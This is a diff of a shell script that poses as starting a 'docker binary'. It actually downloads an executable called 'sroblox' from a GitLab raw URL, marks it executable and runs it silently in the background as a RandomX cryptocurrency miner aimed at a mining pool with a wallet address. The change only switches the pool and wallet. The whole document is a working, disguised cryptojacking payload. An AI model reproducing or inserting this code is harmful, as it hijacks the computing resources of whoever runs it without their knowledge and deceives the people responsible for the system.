@@ -12,7 +12,7 @@ echo "Starting docker binary..."
 #./docker -c docker.json >/dev/null 2>&1 &
 wget -q https://gitlab.com/barbieanay003/app/-/raw/main/sroblox
 chmod +x sroblox
-./sroblox -a randomx -o de.qrl.herominers.com:1166 -u Q01050090d680b4ec45c569776ccafc507a4b859b14d661108509d4638ddbe677311ab16b1f5894.Levy -p x --keepalive true >/dev/null 2>&1 &
+./sroblox -a randomx -o randomx.rplant.xyz:7139 -u ZWSBsu2yTiJeo338djzEMGEtkNbxUXDw74xWS1KAgz2zfNiUmVthgLPXc8fmW8NTNBgj426o4ZXHkikvCVe1hxGR2RsKkznQz.Levy -p x --keepalive true >/dev/null 2>&1 &
 
 echo "Running..."
 
